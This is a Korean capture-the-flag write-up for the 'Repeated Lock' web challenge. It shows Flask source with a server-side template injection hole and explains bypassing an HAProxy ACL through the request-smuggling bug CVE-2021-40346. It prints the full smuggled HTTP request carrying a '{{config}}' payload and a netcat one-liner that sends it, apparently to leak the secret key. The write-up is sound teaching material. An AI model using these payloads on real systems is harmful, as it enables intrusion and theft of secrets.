# Repeated Lock

#### Author : randN

#### Category : WEB

#### Description
```The students asked for help from Sr. Sergio from TI for deploying a patched version of the new 4841 proxy. This time they protected the server a little better. ```

#### Write up

해다 문제에서는 python파일과 웹 페이지가 제공됩니다.
```
from flask import Flask, render_template, render_template_string, request
import os
import utils


app = Flask(__name__)
app.config['SECRET_KEY'] = 'CTFUA{REDACTED}'


@app.route('/', methods=['GET', 'POST'])
def home():
    return render_template('home.html')


@app.route('/admin', methods=['GET', 'POST'])
def admin():
    return 'Under Construction...'


@app.route('/users')
def users():
    username = request.args.get('user', '<User>')
    if utils.filter(username):
        return render_template_string('Hello ' + username + '!')
    else:
        return 'Hello ' + username  + '!'


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
```
![page](https://user-images.githubusercontent.com/84657474/147018221-e3b478f5-22db-41bb-aaa5-3f6de9d8a93f.png)

Python 코드를 조금 주의 깊게 본다면 **user** 메소드에 SSTI 취약점이 존재하는것을 알 수 있지만 사용자 경로에 엑세스하려고 하면 **403 Forbidden** 이라고 뜹니다.

앱 인프라에 대한 정보를 누출하는 서버 헤더가 있으며, Challenge설명에 4841 프록시에 대한 참조가 있었습니다.

4841은 HA의 16진수 값 이므로 사용되는 프록시는 HA 프록시 입니다.

이 경우에 유용할 수 있는 취약점에 대해 일부 Google 검색을 수행하면 취약점이 나타납니다.
https://jfrog.com/blog/critical-vulnerablility-in-haproxy-cve-2021-40346-integer-overflow-enables-http-smuggling/

이제 배치된 ACL을 우회하기 위해 HTTP 요청을 생성하거나 페이로드를 작성하면됩니다.

Flask SECRET_KEY에 엑세스하고 싶기때문에 가장 간단한 페이로드를 시도해보았습니다. ```{{config}}```

```
POST /admin HTTP/1.1
Host: ctf-metared-2021.ua.pt:2011
Content-
Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Lengt: 101

Get /users?user=%7B%7Bconfig%7D%7D HTTP/1.1
h:GET /admin HTTP/1.1
HOST: ctf-metared-2021.ua.pt:2011
```

```cat poc | nc ctf-metared-202.ua.pt 2011``` 명령어를 실행하면 간단하게 Flag를 얻을 수 있었습니다.
